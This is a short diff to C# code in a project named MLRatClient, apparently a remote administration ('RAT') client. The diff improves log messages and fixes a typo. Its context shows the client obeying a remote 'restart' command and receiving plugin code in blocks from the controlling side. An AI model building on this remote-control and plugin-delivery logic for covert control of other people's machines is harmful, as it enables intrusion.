@@ -93,7 +93,7 @@ namespace MLRatClient
         {
             if (plugin != null)
             {
-                Console.WriteLine("{0}: {1}", plugin.ClientPluginID, ex.Message);
+                Console.WriteLine("{0}: {1}", plugin.ClientPluginID, ex.ToString());
             }
             else
             {
@@ -193,6 +193,8 @@ namespace MLRatClient
                     string command = (string) data[1];
                     if (command == "restart")
                     {
+                        Console.WriteLine("Restarting...");
+                        //Console.ReadLine();
                         Process.Start(Assembly.GetExecutingAssembly().Location);
                         Environment.Exit(0);
                     }
@@ -222,7 +224,7 @@ namespace MLRatClient
                                 Console.WriteLine("Started update for plugin id {0}", PluginID.ToString("n"));
                             }
                         }
-                        Console.WriteLine("PLugin block ({0} bytes) recieved. ID: {1}", Block.Length, PluginID.ToString("n"));
+                        Console.WriteLine("Plugin block ({0} bytes) recieved. ID: {1}", Block.Length, PluginID.ToString("n"));
                         PluginUpdates[PluginID].Write(Block, 0, Block.Length);
                         if (FinalBlock)
                         {
